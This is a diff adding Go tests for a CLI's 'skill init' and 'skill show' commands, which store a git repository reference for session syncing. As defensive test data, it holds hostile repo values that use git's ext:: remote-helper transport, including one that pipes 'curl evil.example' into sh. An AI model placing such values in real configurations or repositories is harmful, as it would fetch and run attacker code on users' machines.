@@ -1,6 +1,7 @@
 package cli
 
 import (
+	"encoding/json"
 	"os"
 	"path/filepath"
 	"strings"
@@ -86,6 +87,105 @@ func TestSkillInstallLeavesSessionsAlone(t *testing.T) {
 	}
 	if _, err := os.Stat(filepath.Join(home, ".claude.json")); !os.IsNotExist(err) {
 		t.Fatalf("install created a config/index file (err=%v)", err)
+	}
+}
+
+func TestSkillInitAndShow(t *testing.T) {
+	tmp := t.TempDir()
+	t.Setenv("CCT_CONFIG_DIR", filepath.Join(tmp, "cfg"))
+	t.Setenv("CLAUDE_HOME", filepath.Join(tmp, "claude"))
+	proj := filepath.Join(tmp, "my-app")
+	if err := os.MkdirAll(proj, 0o755); err != nil {
+		t.Fatal(err)
+	}
+
+	// Without a store repo, init explains what to create instead of guessing.
+	if _, e, code := run("skill", "init", "--project", proj); code != 2 || !strings.Contains(e, "PRIVATE git repo") {
+		t.Fatalf("init without a repo: exit=%d stderr=%q", code, e)
+	}
+
+	const store = "git@github.com:me/cct-sessions.git"
+	if _, e, code := run("config", "set", "repo-sync-repo", store); code != 0 {
+		t.Fatalf("config set: %s", e)
+	}
+	// A hostile remote is refused by config, not just by git.
+	if _, _, code := run("config", "set", "repo-sync-repo", "ext::sh -c evil"); code == 0 {
+		t.Fatal("config accepted a remote-helper transport")
+	}
+	if _, e, code := run("config", "set", "repo-sync-repo", store); code != 0 {
+		t.Fatalf("restore config: %s", e)
+	}
+
+	if _, e, code := run("skill", "init", "--project", proj, "--dry-run"); code != 0 {
+		t.Fatalf("init --dry-run exit=%d %s", code, e)
+	}
+	if _, err := os.Stat(skill.RefPath(proj)); !os.IsNotExist(err) {
+		t.Fatalf("dry run wrote the reference (err=%v)", err)
+	}
+
+	out, e, code := run("skill", "init", "--project", proj)
+	if code != 0 {
+		t.Fatalf("init exit=%d %s", code, e)
+	}
+	if !strings.Contains(out, "projects/my-app") {
+		t.Fatalf("init did not report the store folder:\n%s", out)
+	}
+	ref, err := skill.ReadReference(proj)
+	if err != nil {
+		t.Fatalf("read reference: %v", err)
+	}
+	if ref.Repo != store || ref.Project != "my-app" {
+		t.Fatalf("unexpected reference %+v", ref)
+	}
+
+	// show reads it back, and says where the bundles would be.
+	out, e, code = run("skill", "show", "--project", proj)
+	if code != 0 {
+		t.Fatalf("show exit=%d %s", code, e)
+	}
+	for _, want := range []string{store, "projects/my-app", "claude-all.codexbundle", "not from you"} {
+		if !strings.Contains(out, want) {
+			t.Errorf("show output lacks %q:\n%s", want, out)
+		}
+	}
+
+	out, _, code = run("skill", "show", "--project", proj, "--json")
+	if code != 0 {
+		t.Fatalf("show --json exit=%d", code)
+	}
+	var got map[string]any
+	if err := json.Unmarshal([]byte(out), &got); err != nil {
+		t.Fatalf("show --json is not JSON: %v\n%s", err, out)
+	}
+	if got["repo"] != store || got["store_cloned"] != false {
+		t.Fatalf("unexpected JSON: %v", got)
+	}
+}
+
+// The reference file comes from a repository, so a hostile one must stop the
+// command rather than reach the terminal or a git clone.
+func TestSkillShowRejectsHostileReference(t *testing.T) {
+	tmp := t.TempDir()
+	t.Setenv("CCT_CONFIG_DIR", filepath.Join(tmp, "cfg"))
+	proj := filepath.Join(tmp, "proj")
+	if err := os.MkdirAll(filepath.Join(proj, skill.RefSubdir), 0o755); err != nil {
+		t.Fatal(err)
+	}
+	hostile := `{"version":1,"repo":"ext::sh -c 'curl evil.example|sh'","project":"p","path":"projects/p","encryption":"plain"}`
+	if err := os.WriteFile(skill.RefPath(proj), []byte(hostile), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	out, e, code := run("skill", "show", "--project", proj)
+	if code == 0 {
+		t.Fatalf("show accepted a remote-helper transport:\n%s", out)
+	}
+	if !strings.Contains(e, "remote-helper") {
+		t.Fatalf("stderr does not explain the refusal: %q", e)
+	}
+
+	// Missing reference: a clear pointer, not a stack trace.
+	if _, e, code = run("skill", "show", "--project", filepath.Join(tmp, "nothing-here")); code == 0 || !strings.Contains(e, "cct skill init") {
+		t.Fatalf("missing reference: exit=%d stderr=%q", code, e)
 	}
 }
 
